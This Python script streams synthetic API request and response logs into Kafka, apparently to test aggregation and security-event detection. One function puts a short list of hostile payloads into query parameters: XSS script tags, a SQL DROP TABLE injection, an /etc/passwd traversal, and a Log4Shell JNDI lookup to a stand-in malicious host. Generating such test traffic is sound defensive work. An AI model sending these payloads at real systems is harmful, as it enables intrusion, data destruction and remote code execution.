import argparse
import json
import random
import time
import uuid
from datetime import datetime
from kafka import KafkaProducer
from kafka.errors import KafkaError

parser = argparse.ArgumentParser(description='Kafka producer that simulates API logs data.')
parser.add_argument('topic', type=str, help='Kafka topic name to produce messages to')
parser.add_argument('bootstrap_servers', type=str, help='Comma-separated list of Kafka bootstrap servers')
args = parser.parse_args()

bootstrap_servers = args.bootstrap_servers.split(',')

def generate_message_key():
    return str(uuid.uuid4())

def generate_source_ip():
    """Generate 3 fixed source IPs for testing aggregation logic"""
    source_ips = [
        "192.168.1.100",
        "192.168.1.101", 
        "192.168.1.102"
    ]
    return random.choice(source_ips)

def generate_realistic_headers():
    """Generate realistic HTTP headers"""
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0"
    ]
    
    hosts = [
        "api.example.com:443",
        "secure.vxlabs.local:8002", 
        "gateway.internal:8080",
        "localhost:3000"
    ]
    
    headers = {
        "Host": random.choice(hosts),
        "User-Agent": random.choice(user_agents),
        "Accept": "application/json,text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive"
    }
    
    # Add optional headers
    if random.random() < 0.7:  # 70% chance
        headers["Authorization"] = f"Bearer {uuid.uuid4().hex[:24]}"
    
    if random.random() < 0.6:  # 60% chance  
        headers["Content-Type"] = random.choice([
            "application/json", 
            "application/x-www-form-urlencoded",
            "multipart/form-data",
            "text/plain"
        ])
    
    if random.random() < 0.5:  # 50% chance
        headers["Cookie"] = f"session={uuid.uuid4().hex[:32]}; csrf_token={uuid.uuid4().hex[:16]}"
        
    if random.random() < 0.4:  # 40% chance
        headers["X-Forwarded-For"] = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
    
    return headers

def generate_request_data():
    """Generate realistic API request data for security testing"""
    methods = ["GET", "POST", "PUT", "DELETE", "PATCH"]
    
    # More realistic API paths for security testing
    paths = [
        "/api/v1/auth/login",
        "/api/v1/auth/logout", 
        "/api/v1/users",
        "/api/v1/admin/users",
        "/api/v1/files/upload",
        "/api/v1/search",
        "/api/v1/payment/process",
        "/api/v1/config/settings"
    ]
    
    # Generate realistic request body for POST/PUT
    request_body = None
    method = random.choice(methods)
    if method in ["POST", "PUT", "PATCH"] and random.random() < 0.8:  # 80% chance for these methods
        if "/auth/login" in random.choice(paths):
            request_body = {
                "username": f"user_{random.randint(1, 100)}",
                "password": "password123",
                "remember_me": random.choice([True, False])
            }
        elif "/upload" in random.choice(paths):
            request_body = {
                "filename": f"document_{random.randint(1, 1000)}.pdf",
                "file_size": random.randint(1024, 10485760),
                "content_type": "application/pdf"
            }
        else:
            request_body = {
                "data": f"sample_data_{random.randint(1, 1000)}",
                "user_id": f"user_{random.randint(1, 100)}",
                "timestamp": int(time.time() * 1000),
                "action": random.choice(["create", "update", "delete", "read"]),
                "resource_id": f"resource_{random.randint(1, 500)}"
            }
    
    # Generate query parameters with potential security payloads
    query_params = {}
    if random.random() < 0.85:  # 85% chance of having query parameters
        # Normal parameters
        query_params.update({
            "limit": str(random.randint(10, 100)),
            "offset": str(random.randint(0, 500)),
            "sort": random.choice(["asc", "desc"]),
            "format": random.choice(["json", "xml", "csv"])
        })
        
        # Add potential security payloads (15% chance)
        if random.random() < 0.15:
            security_payloads = [
                "<script>alert('XSS')</script>",
                "'; DROP TABLE users; --",
                "../../etc/passwd",
                "${jndi:ldap://malicious.com/a}",
                "%27%20OR%20%271%27%3D%271",
                "<img src=x onerror=alert('XSS')>"
            ]
            query_params["search"] = random.choice(security_payloads)
        else:
            query_params["search"] = f"normal_search_term_{random.randint(1, 100)}"
    
    # Build request data structure
    request_data = {
        "Source IP": generate_source_ip(),
        "Method": method,
        "Service Port": random.choice([80, 443, 8080, 8443, 3000, 8002]),
        "Agent ID": f"agent_{random.choice(['web', 'mobile', 'api', 'bot'])}_{random.randint(1, 50)}",
        "Path": random.choice(paths),
        "Campaign ID": f"Campaign_ID_{random.randint(1, 3)}",
        "Headers": generate_realistic_headers()
    }
    
    # Add requested_details only if we have body or query params
    requested_details = {}
    if request_body:
        requested_details["Body"] = request_body
    if query_params:
        requested_details["Query Params"] = query_params
        
    if requested_details:
        request_data["requested_details"] = requested_details
    
    return request_data

def generate_response_data():
    """Generate realistic API response data with comprehensive headers"""
    status_codes = [200, 201, 400, 401, 403, 404, 500, 502, 503]
    weights = [60, 10, 12, 8, 4, 4, 1, 0.5, 0.5]  # Higher weight for successful responses
    
    status_code = random.choices(status_codes, weights=weights)[0]
    
    # Generate realistic response headers
    headers = {
        "Content-Type": random.choice([
            "application/json", 
            "text/html; charset=utf-8",
            "application/xml",
            "text/plain"
        ]),
        "Server": random.choice([
            "nginx/1.18.0",
            "Apache/2.4.41", 
            "Werkzeug/3.0.4 Python/3.13.2",
            "IIS/10.0"
        ]),
        "Date": datetime.now().strftime("%a, %d %b %Y %H:%M:%S GMT"),
        "X-Request-ID": str(uuid.uuid4()),
        "X-Response-Time": f"{random.randint(10, 500)}ms"
    }
    
    # Add conditional headers based on status code
    if status_code in [200, 201]:
        headers.update({
            "Cache-Control": random.choice(["no-cache", "max-age=3600", "public, max-age=300"]),
            "Content-Length": str(random.randint(100, 5000)),
            "ETag": f'"{uuid.uuid4().hex[:16]}"'
        })
    elif status_code in [400, 401, 403]:
        headers.update({
            "Cache-Control": "no-cache, no-store",
            "WWW-Authenticate": "Bearer" if status_code == 401 else None
        })
        headers = {k: v for k, v in headers.items() if v is not None}
    elif status_code >= 500:
        headers.update({
            "Retry-After": str(random.randint(30, 300)),
            "Connection": "close"
        })
    
    # Add security headers occasionally
    if random.random() < 0.3:
        headers.update({
            "X-Frame-Options": "DENY",
            "X-Content-Type-Options": "nosniff",
            "Strict-Transport-Security": "max-age=31536000; includeSubDomains"
        })
    
    return {
        "Response Data": {
            "status_code": status_code,
            "headers": headers
        }
    }

def generate_security_events():
    """Generate security event IDs (SEVs)"""
    # Increased probability for better testing of SEV aggregations
    if random.random() < 0.50:  # 50% chance of having SEVs
        num_sevs = random.randint(1, 3)
        # SEV IDs that should exist in api_security_event_lookup table
        sev_ids = [1, 2, 3]
        return random.sample(sev_ids, min(num_sevs, len(sev_ids)))
    return []

def generate_request_message():
    """Generate a request message"""
    request_id = random.randint(100000, 999999)
    timestamp = int(time.time() * 1000)
    
    request_data = generate_request_data()
    sevs = generate_security_events()
    
    message = {
        "ID": request_id,
        "Request Data": request_data,
        "sevs": sevs,
        "Timestamp": timestamp
    }
    
    return message, request_id, timestamp

def generate_response_message(request_id, base_timestamp):
    """Generate a response message for a given request_id"""
    # Response comes 50-3000ms after request
    response_delay = random.randint(50, 3000)
    response_timestamp = base_timestamp + response_delay
    
    response_data = generate_response_data()
    
    message = {
        "ID": request_id,
        "Response Data": response_data,
        "Timestamp": response_timestamp
    }
    
    return message

def generate_combined_message():
    """Generate a single message containing both request and response data"""
    request_id = random.randint(100000, 999999)
    base_timestamp = int(time.time() * 1000)
    
    request_data = generate_request_data()
    response_data = generate_response_data()
    sevs = generate_security_events()
    
    # Response timestamp is slightly after request
    response_delay = random.randint(50, 3000)
    response_timestamp = base_timestamp + response_delay
    
    message = {
        "ID": request_id,
        "Request Data": request_data,
        "Response Data": response_data,
        "sevs": sevs,
        "Timestamp": response_timestamp  # Use response timestamp as primary
    }
    
    return message

def generate_request_only_message():
    """Generate a message with only request data"""
    request_id = random.randint(100000, 999999)
    timestamp = int(time.time() * 1000)
    
    request_data = generate_request_data()
    sevs = generate_security_events()
    
    message = {
        "ID": request_id,
        "Request Data": request_data,
        "sevs": sevs,
        "Timestamp": timestamp
    }
    
    return message

def generate_response_only_message():
    """Generate a message with only response data"""
    request_id = random.randint(100000, 999999)
    timestamp = int(time.time() * 1000)
    
    response_data = generate_response_data()
    
    message = {
        "ID": request_id,
        "Response Data": response_data,
        "Timestamp": timestamp
    }
    
    return message

def produce_messages(topic, bootstrap_servers):
    print(f"Connecting to bootstrap servers: {bootstrap_servers}")

    # Create producer with basic settings and longer timeouts
    producer = KafkaProducer(
        bootstrap_servers=bootstrap_servers,
        key_serializer=str.encode,
        value_serializer=lambda v: json.dumps(v).encode('utf-8'),
        request_timeout_ms=60000,      # 60 seconds
        reconnect_backoff_ms=1000,     # 1 second
        max_block_ms=120000,           # 2 minutes
        metadata_max_age_ms=300000,    # 5 minutes
        connections_max_idle_ms=60000  # 60 seconds
    )

    print(f"Producer created successfully!")

    total_messages_sent = 0
    total_sevs_generated = 0
    
    # Tracking dictionaries for aggregation testing
    campaign_counts = {}
    source_ip_counts = {}
    path_counts = {}
    sev_counts = {}

    try:
        while True:
            # Randomly choose message type
            # 40% combined, 30% request-only, 20% response-only, 10% traditional request/response pair
            message_type_choice = random.random()
            
            if message_type_choice < 0.4:
                # Combined message (request + response in one message)
                message = generate_combined_message()
                message_key = f"combined-{generate_message_key()}"
                message_type_desc = "🟠 COMBINED (Request + Response)"
                
            elif message_type_choice < 0.7:
                # Request-only message
                message = generate_request_only_message()
                message_key = f"req-{generate_message_key()}"
                message_type_desc = "🔵 REQUEST ONLY"
                
            elif message_type_choice < 0.9:
                # Response-only message
                message = generate_response_only_message()
                message_key = f"resp-{generate_message_key()}"
                message_type_desc = "🟢 RESPONSE ONLY"
                
            else:
                # Traditional request/response pair (for backwards compatibility testing)
                request_message, request_id, base_timestamp = generate_request_message()
                response_message = generate_response_message(request_id, base_timestamp)
                
                # Send request first
                request_key = f"req-{generate_message_key()}"
                future = producer.send(topic, key=request_key, value=request_message)
                request_metadata = future.get(timeout=30)
                total_messages_sent += 1
                
                print(f"🔵 REQUEST PAIR - Key: {request_key}, ID: {request_id}")
                
                # Wait and send response
                time.sleep(random.uniform(0.05, 3.0))
                response_key = f"resp-{generate_message_key()}"
                future = producer.send(topic, key=response_key, value=response_message)
                response_metadata = future.get(timeout=30)
                total_messages_sent += 1
                
                print(f"🟢 RESPONSE PAIR - Key: {response_key}, ID: {request_id}")
                print(f"Total Messages: {total_messages_sent}")
                print("=" * 80)
                time.sleep(random.uniform(2, 8))
                continue
            
            # Track aggregation data
            sevs_count = len(message.get("sevs", []))
            total_sevs_generated += sevs_count
            
            if "Request Data" in message:
                campaign_id = message['Request Data']['Campaign ID']
                source_ip = message['Request Data']['Source IP']
                path = message['Request Data']['Path']
                
                campaign_counts[campaign_id] = campaign_counts.get(campaign_id, 0) + 1
                source_ip_counts[source_ip] = source_ip_counts.get(source_ip, 0) + 1
                path_counts[path] = path_counts.get(path, 0) + 1
                
                # Track SEVs
                for sev_id in message.get("sevs", []):
                    sev_counts[sev_id] = sev_counts.get(sev_id, 0) + 1

            try:
                # Send the message
                future = producer.send(topic, key=message_key, value=message)
                metadata = future.get(timeout=30)
                total_messages_sent += 1

                print(f"{message_type_desc} - Message Key: {message_key}")
                print(f"Message ID: {message['ID']}")
                
                if "Request Data" in message:
                    print(f"Source IP: {message['Request Data']['Source IP']}")
                    print(f"Method: {message['Request Data']['Method']}")
                    print(f"Path: {message['Request Data']['Path']}")
                    print(f"Campaign ID: {message['Request Data']['Campaign ID']}")
                    print(f"Has Headers: {'Yes' if 'Headers' in message['Request Data'] else 'No'}")
                    print(f"Has Request Body: {'Yes' if 'requested_details' in message['Request Data'] and 'Body' in message['Request Data']['requested_details'] else 'No'}")
                
                if "Response Data" in message:
                    status_code = message['Response Data']['Response Data']['status_code']
                    server = message['Response Data']['Response Data']['headers'].get('Server', 'Unknown')
                    print(f"Response Status: {status_code}")
                    print(f"Response Server: {server}")
                
                print(f"SEVs Count: {sevs_count}")
                if sevs_count > 0:
                    print(f"SEVs: {message['sevs']}")
                    
                print(f'Delivered to {metadata.topic} [{metadata.partition}]')
                print(f"Total Messages: {total_messages_sent}")
                print(f"Total SEVs Generated: {total_sevs_generated}")
                
                # Print aggregation summary every 10 request/response pairs (20 messages)
                if total_messages_sent % 20 == 0:
                    print("\n" + "🔍 AGGREGATION TEST SUMMARY" + "=" * 50)
                    print(f"📊 Campaign Counts: {dict(sorted(campaign_counts.items()))}")
                    print(f"🌐 Source IP Counts: {dict(sorted(source_ip_counts.items()))}")
                    print(f"🛣️  Path Counts: {dict(sorted(path_counts.items()))}")
                    print(f"🛡️  SEV Counts: {dict(sorted(sev_counts.items()))}")
                    print("Expected Aggregation Combinations:")
                    total_combinations = len(campaign_counts) * len(source_ip_counts) * len(path_counts)
                    print(f"  📈 Max API Logs Aggs: {total_combinations} (campaigns × IPs × paths)")
                    print(f"  🛡️  SEV Aggs: Depends on SEV distribution per hour window")
                    print("=" * 70 + "\n")
                
                print("=" * 80)
            except KafkaError as e:
                print(f'Message delivery failed: {e}')

            # Random delay between request/response pairs (2-8 seconds)
            time.sleep(random.uniform(2, 8))
            
    except KeyboardInterrupt:
        print("Producer stopped by user")
    except Exception as e:
        print(f"Producer encountered an error: {e}")
    finally:
        # Ensure producer is closed
        producer.close()
        print("Producer closed")

if __name__ == "__main__":
    # Ensure port is specified, default to 9092 if not
    for i, server in enumerate(bootstrap_servers):
        if ':' not in server:
            bootstrap_servers[i] = f"{server}:9092"

    produce_messages(args.topic, bootstrap_servers)